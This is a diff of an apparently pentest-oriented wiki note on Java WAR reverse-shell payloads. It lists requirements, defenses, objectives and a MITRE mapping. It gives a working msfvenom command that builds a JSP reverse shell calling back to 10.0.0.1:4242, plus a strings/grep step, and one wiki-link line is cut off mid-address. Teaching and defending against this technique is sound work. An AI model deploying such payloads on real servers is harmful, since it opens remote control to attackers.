@@ -37,6 +37,8 @@ From a technical perspective, the Java Reverse Shell Payload - War works by esta
 
 The business value of this type of attack is clear. By gaining access to a compromised system, an attacker can steal sensitive data, install additional malware, or use the compromised system as a launching point for additional attacks.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable server that can deploy WAR files
@@ -44,6 +46,8 @@ The business value of this type of attack is clear. By gaining access to a compr
 1. Knowledge of the server's network configuration and security measures
 
 1. Tools to connect to the compromised system through a reverse shell
+
+ 
 
 ## Defense
 
@@ -53,6 +57,8 @@ The business value of this type of attack is clear. By gaining access to a compr
 
 1. Monitor network traffic for suspicious activity, such as connections to known command and control servers
 
+ 
+
 ## Objectives
 
 1. Remotely access and control a compromised system
@@ -61,6 +67,8 @@ The business value of this type of attack is clear. By gaining access to a compr
 
 1. Bypass firewalls and other security measures
 
+ 
+
 # Instructions
 
 1. To generate a Java reverse shell payload using Metasploit, run the following command:
@@ -68,11 +76,19 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port>
 This will generate a payload in the form of a .war file. Next, use the 'strings' command to extract the name of the JSP file within the payload:
 strings reverse.war | grep jsp
 
+ 
+
+
+
 **Code**: [[msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.]]
+
+
 
 > The 'msfvenom' command is used to create custom payloads for use in penetration testing. In this case, we are using the 'java/jsp_shell_reverse_tcp' payload, which creates a reverse shell that connects back to the attacker's system. The 'LHOST' and 'LPORT' options specify the IP address and port number of the attacker's system that the reverse shell should connect to. The '-f war' option specifies the output format as a .war file, which is a Java web application archive. The '>' symbol redirects the output to a file called 'reverse.war'.
 
 The 'strings' command is used to extract human-readable text from binary files. In this case, we are using it to search for the name of the JSP file within the 'reverse.war' file. The 'grep' command is used to filter the output of the 'strings' command to only show lines containing the string 'jsp'.
+
+
 
 **Command** ([[Generate Java Reverse Shell Payload]]):
 
@@ -80,11 +96,17 @@ The 'strings' command is used to extract human-readable text from binary files. 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
 ```
 
+
+
+
+
 **Command** ([[Find Name of JSP File]]):
 
 ```bash
 strings reverse.war | grep jsp
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -108,3 +130,5 @@ strings reverse.war | grep jsp
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
 - [[War]]
+
+
